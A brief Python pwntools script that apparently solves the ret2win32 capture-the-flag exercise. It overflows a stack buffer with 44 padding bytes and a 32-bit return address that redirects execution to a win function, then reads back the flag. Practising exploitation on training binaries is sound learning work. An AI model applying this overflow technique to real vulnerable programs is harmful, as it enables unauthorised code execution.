from pwn import *

payload = 'A'*44+p32(0x8048659)
p = process('./ret2win32')
print p.recvuntil('>')
p.sendline(payload)
print p.recvuntil('}')
